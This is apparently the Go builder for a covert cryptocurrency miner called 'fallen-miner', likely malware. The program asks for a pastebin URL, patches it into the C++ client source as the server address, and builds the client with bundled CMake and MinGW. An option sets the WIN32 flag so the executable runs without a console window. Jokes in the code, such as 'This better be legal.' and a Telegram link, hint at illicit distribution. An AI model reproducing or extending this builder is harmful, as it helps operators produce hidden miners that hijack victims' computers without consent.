package main

import (
	"bufio"
	"bytes"
	"fmt"
	"math/rand"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
)

const (
	pastebinlink   = ""
	srcFile        = "src/main.cpp"
	backupFileName = "src/main.cpp.bak"
)

var (
	cmakePath string
	makePath  string
	mingwPath string
)

type Config struct {
	Url string `json:"url"`
}

func init() {

	exeDir, _ := os.Executable()
	baseDir := filepath.Dir(exeDir)

	cmakePath = filepath.Join(baseDir, "portable_tools", "cmake", "bin", "cmake.exe")
	makePath = filepath.Join(baseDir, "portable_tools", "make", "bin", "make.exe")
	mingwPath = filepath.Join(baseDir, "portable_tools", "mingw64", "bin")

	currentPath := os.Getenv("PATH")
	newPath := fmt.Sprintf("%s;%s", mingwPath, currentPath)
	os.Setenv("PATH", newPath)
}

func main() {
	reader := bufio.NewReader(os.Stdin)
	fmt.Println("Ensure that the url is a direct link, e.g. https://pastebin.com/raw/ZHXsGnnu")
	fmt.Print("Enter the URL: ")
	url, err := reader.ReadString('\n')
	if err != nil {
		fmt.Printf("Error reading input: %v\n", err)
		return
	}
	url = strings.TrimSpace(url)

	// Get debug mode preference
	fmt.Print("Enable debug mode? (y/n): ")
	debugInput, err := reader.ReadString('\n')
	if err != nil {
		fmt.Printf("Error reading input: %v\n", err)
		return
	}
	debugMode := strings.ToLower(strings.TrimSpace(debugInput)) == "y"

	// Modify CMakeLists.txt based on debug mode
	err = toggleWin32Flag(debugMode)
	if err != nil {
		fmt.Printf("Error modifying CMakeLists.txt: %v\n", err)
		return
	}
	defer func() {
		// Restore original state when done
		err := toggleWin32Flag(!debugMode)
		if err != nil {
			fmt.Printf("Error restoring CMakeLists.txt: %v\n", err)
		}
	}()

	buildclient(url)

}

func toggleWin32Flag(debugMode bool) error {
	content, err := os.ReadFile("CMakeLists.txt")
	if err != nil {
		return err
	}

	lines := strings.Split(string(content), "\n")
	targetLine := "add_executable(fallen-miner"
	win32Flag := "WIN32"

	for i, line := range lines {
		if strings.Contains(line, targetLine) {
			if debugMode {
				// Comment out WIN32 flag
				lines[i] = strings.Replace(line, win32Flag, "#"+win32Flag, 1)
			} else {
				// Uncomment WIN32 flag
				lines[i] = strings.Replace(line, "#"+win32Flag, win32Flag, 1)
			}
			break
		}
	}

	modifiedContent := strings.Join(lines, "\n")
	err = os.WriteFile("CMakeLists.txt", []byte(modifiedContent), 0644)
	if err != nil {
		return err
	}

	return nil
}

func copyFile(src, dest string) error {

	data, err := os.ReadFile(src)
	if err != nil {
		return err
	}

	err = os.WriteFile(dest, data, 0644)
	if err != nil {
		return err
	}

	return nil
}

func CopyFolder(src, dst string) error {

	srcInfo, err := os.Stat(src)
	if err != nil {
		return err
	}

	err = os.MkdirAll(dst, srcInfo.Mode())
	if err != nil {
		return err
	}

	entries, err := os.ReadDir(src)
	if err != nil {
		return err
	}

	for _, entry := range entries {
		srcPath := src + "/" + entry.Name()
		dstPath := dst + "/" + entry.Name()

		if entry.IsDir() {
			err = CopyFolder(srcPath, dstPath)
			if err != nil {
				return err
			}
		} else {

			err = copyFile(srcPath, dstPath)
			if err != nil {
				return err
			}
		}
	}
	return nil
}

func randomquote() string {
	quote := []string{"This better be legal.", "I can't stick to a schedule", "This should work...", "At least I don't steal bots *cough*", "t.me/fallenminer", "You like jazz?"}
	return quote[rand.Intn(len(quote))]
}

func buildclient(serveraddress string) {
	originalDir, err := os.Getwd()
	if err != nil {
		panic(err)
	}
	defer os.Chdir(originalDir)

	fmt.Println("building: ", randomquote())

	if err := backupFile(srcFile, backupFileName); err != nil {
		panic(err)
	}

	if err := modifyURL(srcFile, serveraddress); err != nil {
		panic(err)
	}

	if err := buildProject(); err != nil {
		fmt.Println(err)
	}

	if err := restoreFile(backupFileName, srcFile); err != nil {
		panic(err)
	}

	fmt.Println("built.")
}

func backupFile(src, dst string) error {
	fmt.Printf("Backing up %s to %s\n", src, dst)
	return copyFile(src, dst)
}

func modifyURL(filename, newURL string) error {
	fmt.Printf("Modifying URL in %s to %s\n", filename, newURL)

	content, err := os.ReadFile(filename)
	if err != nil {
		return err
	}

	// Replace any existing URL pattern
	newContent := bytes.Replace(content,
		[]byte(`std::wstring url = L"http";`),
		[]byte(fmt.Sprintf(`std::wstring url = L"%s";`, newURL)),
		1)

	return os.WriteFile(filename, newContent, 0644)
}

func buildProject() error {
	fmt.Println("Configuring project with CMake...")

	// Create build directory
	if err := os.MkdirAll("build", 0755); err != nil {
		return err
	}

	// Use absolute path to CMake
	cmake := exec.Command(cmakePath, "-G", "MinGW Makefiles", "..")
	// cmake.Stdout = os.Stdout
	// cmake.Stderr = os.Stderr
	cmake.Dir = "build"
	if err := cmake.Run(); err != nil {
		return fmt.Errorf("CMake failed: %v", err)
	}

	numCores := runtime.NumCPU()
	fmt.Printf("Using %d CPU cores\n", numCores)
	make := exec.Command(makePath, fmt.Sprintf("-j%d", numCores))
	// make.Stdout = os.Stdout
	// make.Stderr = os.Stderr
	make.Env = append(os.Environ(), fmt.Sprintf("PATH=%s;%s", mingwPath, os.Getenv("PATH")))
	make.Dir = "build"
	return make.Run()
}

func restoreFile(src, dst string) error {
	fmt.Printf("Restoring %s from %s\n", dst, src)
	return copyFile(src, dst)
}
